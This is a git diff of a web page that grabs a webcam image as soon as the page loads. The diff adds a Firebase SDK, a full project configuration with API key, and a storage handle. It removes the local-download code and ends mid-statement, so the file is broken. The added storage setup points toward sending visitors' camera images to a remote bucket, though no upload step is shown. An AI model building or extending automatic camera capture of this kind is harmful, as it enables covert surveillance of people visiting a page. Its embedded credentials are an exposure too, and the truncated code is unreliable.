@@ -113,6 +113,9 @@
             color: #C53030;
         }
     </style>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
 </head>
 <body>
     <div class="header">
@@ -147,6 +150,22 @@
         </div>
     </div>
     <script>
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyB57Hc4XVUG66g2lS4EvjyUfhivUx4ApPs",
+        authDomain: "airavat-97b61.firebaseapp.com",
+        databaseURL: "https://airavat-97b61-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "airavat-97b61",
+        storageBucket: "airavat-97b61.appspot.com",
+        messagingSenderId: "505168497738",
+        appId: "1:505168497738:web:2fe336c5418b11d63f6ab3",
+        measurementId: "G-4YFB37M4C3"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+
         async function captureImage() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -168,23 +187,4 @@
 
                 // Capture the image
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageUrl = canvas.toDataURL('image/png');
-
-                // Create a link to download the image
-                const link = document.createElement('a');
-                link.href = imageUrl;
-                link.download = 'capture.png';
-                link.click();
-
-                // Stop the video stream
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error('Error accessing the camera', error);
-            }
-        }
-
-        // Automatically capture image when the page loads
-        window.addEventListener('load', captureImage);
-    </script>
-</body>
-</html>
+                const imageUrl =
